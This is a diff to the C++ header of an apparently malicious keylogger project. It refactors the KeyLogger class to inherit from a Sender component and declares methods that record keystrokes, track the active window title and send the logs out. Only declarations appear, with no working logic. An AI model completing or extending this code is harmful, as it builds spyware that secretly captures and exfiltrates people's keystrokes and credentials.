@@ -12,30 +12,33 @@
 #include "../Time/Time.h"
 #include "../install/Install.h"
 #include "../converter/Converter.h"
+#include "../Sender/Sender.h"
+#include "../configuration.h"
 
 
 
-class KeyLogger {
+class KeyLogger : public Sender {
 
 public:
-    explicit KeyLogger(Stream stream,const std::string&);
-    bool isRecordingKeys() const;
-    void setRecordingKeys(bool isRecording);
-    void sendKeyLoggerLog();
-    void sendAllKeyLoggerLogs() const;
-    bool lastLogExists();
-    bool logsExists();
+    explicit KeyLogger(const Stream &stream);
+    void sendLastKeyloggerLog();
+    void sendAll() const;
     void tryStart();
+    void stopKeylogger();
+    void send() override;
+    void sendState() const;
+
 private:
+    [[nodiscard]] bool lastLogExists() const;
+    [[nodiscard]] bool logsExists() const;
     void start();
-    const std::wstring pathOfLogs;
+    std::wstring pathOfLogs;
     std::wstring logsFileName= generateLogName();
-    Stream stream;
     std::atomic<bool> recordingKeys = false;
     std::string tempWindow;
-    std::string getCurrentWindow();
-    bool checkShift();
-    bool checkAltGr();
+    static std::string getCurrentWindow();
+    static bool checkShift();
+    static bool checkAltGr();
     void writeCharIntoLogFile(const char *string);
     void writeCharIntoLogFile(char string);
     std::wstring generateLogName();
